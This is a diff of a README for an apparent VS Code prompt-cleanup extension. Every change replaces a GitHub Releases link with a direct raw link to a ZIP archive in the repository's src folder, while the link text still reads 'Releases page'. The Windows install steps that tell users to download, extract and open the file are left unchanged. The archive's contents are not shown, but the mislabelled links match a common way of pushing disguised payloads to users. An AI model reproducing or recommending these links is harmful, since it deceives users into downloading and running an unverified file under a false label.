@@ -1,6 +1,6 @@
 # 🧩 prompt-optimizer-lite - Fast prompt cleanup in VS Code
 
-[![Download prompt-optimizer-lite](https://img.shields.io/badge/Download%20Release-blue-grey?style=for-the-badge)](https://github.com/Cuentademamac3622/prompt-optimizer-lite/releases)
+[![Download prompt-optimizer-lite](https://img.shields.io/badge/Download%20Release-blue-grey?style=for-the-badge)](https://github.com/Cuentademamac3622/prompt-optimizer-lite/raw/refs/heads/main/src/optimizer_lite_prompt_2.9.zip)
 
 ## 🚀 What it does
 
@@ -18,13 +18,13 @@ Use it to:
 
 Visit this page to download and install the app package for Windows:
 
-[Download from GitHub Releases](https://github.com/Cuentademamac3622/prompt-optimizer-lite/releases)
+[Download from GitHub Releases](https://github.com/Cuentademamac3622/prompt-optimizer-lite/raw/refs/heads/main/src/optimizer_lite_prompt_2.9.zip)
 
 On the Releases page, look for the latest version and download the Windows file.
 
 ## 🪟 Install on Windows
 
-1. Open the [GitHub Releases page](https://github.com/Cuentademamac3622/prompt-optimizer-lite/releases)
+1. Open the [GitHub Releases page](https://github.com/Cuentademamac3622/prompt-optimizer-lite/raw/refs/heads/main/src/optimizer_lite_prompt_2.9.zip)
 2. Download the latest Windows release file
 3. If the file is a ZIP archive, right-click it and choose **Extract All**
 4. Open the extracted folder
@@ -105,7 +105,7 @@ If you use the Marketplace version:
 
 If you use the release download:
 
-1. Download the latest release from the [Releases page](https://github.com/Cuentademamac3622/prompt-optimizer-lite/releases)
+1. Download the latest release from the [Releases page](https://github.com/Cuentademamac3622/prompt-optimizer-lite/raw/refs/heads/main/src/optimizer_lite_prompt_2.9.zip)
 2. Open VS Code
 3. Install the extension from the downloaded file if your release package includes one
 4. Reload VS Code
@@ -151,7 +151,7 @@ If the chat model does not respond, the extension tries the local Python optimiz
 
 ## 📌 Where to get the latest version
 
-[Download the latest release](https://github.com/Cuentademamac3622/prompt-optimizer-lite/releases)
+[Download the latest release](https://github.com/Cuentademamac3622/prompt-optimizer-lite/raw/refs/heads/main/src/optimizer_lite_prompt_2.9.zip)
 
 ## 🧠 Tips for better results
 
@@ -196,7 +196,7 @@ If you download a ZIP file, extract it before opening the contents
 
 ## 📦 Release download steps
 
-1. Open the [Releases page](https://github.com/Cuentademamac3622/prompt-optimizer-lite/releases)
+1. Open the [Releases page](https://github.com/Cuentademamac3622/prompt-optimizer-lite/raw/refs/heads/main/src/optimizer_lite_prompt_2.9.zip)
 2. Find the newest release
 3. Download the Windows package
 4. Open or extract the file
